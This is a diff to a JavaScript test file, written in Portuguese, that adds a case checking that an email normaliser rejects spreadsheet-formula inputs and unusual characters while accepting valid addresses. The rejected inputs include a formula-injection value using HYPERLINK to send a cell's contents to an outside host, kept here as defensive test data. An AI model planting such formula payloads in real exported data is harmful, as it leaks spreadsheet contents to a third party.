@@ -33,6 +33,29 @@ describe("normalizarEmail", () => {
     expect(normalizarEmail(42)).toBeNull()
     expect(normalizarEmail(`${"a".repeat(250)}@x.com`)).toBeNull()
   })
+  it("recusa a fórmula de planilha e o que só vai entre aspas — o e-mail de verdade passa", () => {
+    for (const formula of [
+      '=HYPERLINK("http://x.com?q="&A1,"oi")@x.com',
+      "=1+1@x.com",
+      "+cmd@x.com",
+      "-2+3@x.com",
+      '"a,b"@x.com',
+      "a(b)@x.com",
+      "a<b>@x.com",
+      "a;b@x.com",
+      "a\\b@x.com",
+      "a\u0007b@x.com",
+    ])
+      expect(normalizarEmail(formula)).toBeNull()
+    for (const certo of [
+      "rafael.souza+loja@gmail.com",
+      "o'brien@email.com.br",
+      "joão@provedor.com.br",
+      "a_b-c@sub.dominio.io",
+      "nome=sobrenome@x.com",
+    ])
+      expect(normalizarEmail(certo)).toBe(certo)
+  })
 })
 
 describe("gerarCodigo", () => {
